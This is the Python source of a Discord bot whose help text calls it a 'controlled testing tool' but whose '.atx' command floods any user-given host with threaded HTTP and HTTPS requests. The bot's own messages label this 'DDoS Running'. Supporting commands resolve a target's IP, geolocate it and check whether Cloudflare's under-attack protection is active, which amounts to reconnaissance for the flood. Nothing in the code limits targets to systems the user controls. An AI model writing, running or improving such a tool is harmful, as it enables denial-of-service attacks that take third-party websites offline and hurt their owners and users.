import discord
from discord.ext import commands
import requests
import threading
import asyncio
import time
import socket
import os
from urllib.parse import urlparse
from dotenv import load_dotenv

# ================= LOAD ENV =================
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
PREFIX = os.getenv("COMMAND_PREFIX", ".")
MAX_THREADS = int(os.getenv("MAX_THREADS", 100))
MAX_DURATION = int(os.getenv("MAX_DURATION", 120))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))
TIMEOUT = 6
# ===========================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ================= GLOBAL STATE =============
atx_running = False
atx_stats = {"http": 0, "https": 0, "tcp": 0, "errors": 0}
atx_owner = None
# ===========================================

# ================= EVENTS ===================
@bot.event
async def on_ready():
    print(f"Database online as {bot.user}")
# ===========================================

# ================= HELP =====================
@bot.command()
async def help(ctx):
    e = discord.Embed(
        title="Database",
        description="Panel status & controlled testing tool",
        color=0x2563eb
    )
    e.add_field(
        name="Commands",
        value=(
            "`.atx <url> <threads> <seconds>` – HTTP + HTTPS requests\n"
            "`.stop` – stop ATX\n"
            "`.status <panel_url>` – panel status & protection\n"
            "`.check <panel_url>` – Cloudflare Under Attack check\n"
            "`.ip <url>` – IP lookup\n"
            "`.loc <url|ip>` – Geo location"
        ),
        inline=False
    )
    await ctx.send(embed=e)
# ===========================================

# ================= IP =======================
@bot.command()
async def ip(ctx, target: str):
    host = urlparse(target).hostname if target.startswith("http") else target
    try:
        ip_addr = socket.gethostbyname(host)
        e = discord.Embed(title="🌍 IP Lookup", color=0x2563eb)
        e.add_field(name="Host", value=host, inline=False)
        e.add_field(name="IP", value=ip_addr)
        await ctx.send(embed=e)
    except Exception as ex:
        await ctx.send(f"❌ Error: `{ex}`")
# ===========================================

# ================= LOCATION =================
@bot.command()
async def loc(ctx, target: str):
    if target.startswith("http"):
        host = urlparse(target).hostname
        ip = socket.gethostbyname(host)
    else:
        ip = target

    r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    if r.get("status") != "success":
        await ctx.send("❌ Location lookup failed.")
        return

    e = discord.Embed(title="📍 IP Location", color=0x16a34a)
    e.add_field(name="IP", value=ip, inline=False)
    e.add_field(name="Country", value=f"{r['country']} ({r['countryCode']})")
    e.add_field(name="Region", value=r["regionName"])
    e.add_field(name="City", value=r["city"])
    e.add_field(name="ISP", value=r["isp"], inline=False)
    e.add_field(name="ASN", value=r["as"])
    e.add_field(name="Timezone", value=r["timezone"])
    await ctx.send(embed=e)
# ===========================================

# ================= STATUS (IMPROVED) ========
@bot.command()
async def status(ctx, panel_url: str):
    if not panel_url.startswith("http"):
        await ctx.send("❌ URL must start with http:// or https://")
        return

    host = urlparse(panel_url).hostname

    try:
        ip = socket.gethostbyname(host)
    except:
        ip = "Unknown"

    reachable = False
    code = "—"
    reason = "No response"
    latency = "—"
    redirects = "—"
    server = "Unknown"
    content_type = "Unknown"
    size = "—"

    cloudflare = False
    under_attack = False

    try:
        start = time.time()
        r = requests.get(panel_url, timeout=TIMEOUT, allow_redirects=True)
        latency = f"{time.time() - start:.2f}s"
        code = r.status_code
        reason = r.reason
        redirects = len(r.history)
        server = r.headers.get("Server", "Unknown")
        content_type = r.headers.get("Content-Type", "Unknown")
        size = f"{len(r.content)} bytes"
        reachable = True

        if "cloudflare" in server.lower():
            cloudflare = True
            body = r.text.lower()
            if (
                "checking your browser" in body or
                "cf-challenge" in body or
                "attention required" in body
            ):
                under_attack = True
    except:
        reachable = False

    verdict = "🟢 ONLINE" if reachable else "🔴 OFFLINE"

    e = discord.Embed(
        title="🖥️ Panel Status",
        description=f"**{verdict}**\n`{panel_url}`",
        color=0x16a34a if reachable else 0xdc2626
    )

    e.add_field(name="Resolved IP", value=ip, inline=False)
    e.add_field(
        name="HTTP Response",
        value=f"{code} ({reason})\nLatency: `{latency}`\nRedirects: `{redirects}`",
        inline=False
    )
    e.add_field(name="Server", value=f"`{server}`", inline=False)
    e.add_field(
        name="Content",
        value=f"Type: `{content_type}`\nSize: `{size}`",
        inline=False
    )

    if cloudflare:
        e.add_field(
            name="Cloudflare",
            value="🚨 Under Attack: ON" if under_attack else "🟢 Under Attack: OFF",
            inline=False
        )
    else:
        e.add_field(name="Cloudflare", value="❌ Not Detected", inline=False)

    e.set_footer(text="Database • Panel Intelligence")
    await ctx.send(embed=e)
# ===========================================

# ================= CHECK ====================
@bot.command()
async def check(ctx, panel_url: str):
    await status(ctx, panel_url)
# ===========================================

# ================= ATX WORKER ===============
def atx_worker(host):
    global atx_running, atx_stats
    while atx_running:
        try:
            requests.get(f"http://{host}", timeout=TIMEOUT)
            atx_stats["http"] += 1
        except:
            atx_stats["errors"] += 1

        try:
            requests.get(f"https://{host}", timeout=TIMEOUT)
            atx_stats["https"] += 1
        except:
            atx_stats["errors"] += 1

        time.sleep(0.05)
# ===========================================

# ================= ATTACK ======================
@bot.command()
async def atx(ctx, url: str, threads: int, seconds: int):
    global atx_running, atx_stats, atx_owner

    if atx_running:
        return

    if threads < 1 or threads > MAX_THREADS or seconds < 1:
        return

    host = urlparse(url).hostname
    atx_owner = ctx.author
    atx_running = True
    atx_stats = {"http": 0, "https": 0, "tcp": 0, "errors": 0}

    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel is None:
        atx_running = False
        return

    embed = discord.Embed(title="⚡ DDoS Running", color=0x16a34a)
    embed.add_field(name="HTTP", value="0")
    embed.add_field(name="HTTPS", value="0")
    embed.add_field(name="Errors", value="0")
    embed.add_field(name="RPS", value="0.00", inline=False)
    embed.add_field(name="Elapsed", value=f"0s / {seconds}s")

    msg = await channel.send(embed=embed)

    for _ in range(threads):
        threading.Thread(target=atx_worker, args=(host,), daemon=True).start()

    start = time.time()
    while atx_running and time.time() - start < seconds:
        elapsed = int(time.time() - start)
        total = atx_stats["http"] + atx_stats["https"]
        rps = total / max(1, elapsed)

        embed.set_field_at(0, name="HTTP", value=str(atx_stats["http"]))
        embed.set_field_at(1, name="HTTPS", value=str(atx_stats["https"]))
        embed.set_field_at(2, name="Errors", value=str(atx_stats["errors"]))
        embed.set_field_at(3, name="RPS", value=f"{rps:.2f}", inline=False)
        embed.set_field_at(4, name="Elapsed", value=f"{elapsed}s / {seconds}s")

        await msg.edit(embed=embed)
        await asyncio.sleep(2)

    atx_running = False
# ===========================================

# ================= STOP =====================
@bot.command()
async def stop(ctx):
    global atx_running

    if not atx_running:
        await ctx.send("⚠️ No attack is currently running.")
        return

    atx_running = False
    await ctx.send("🛑 **DDoS stopped successfully.**")
# ===========================================

bot.run(TOKEN)
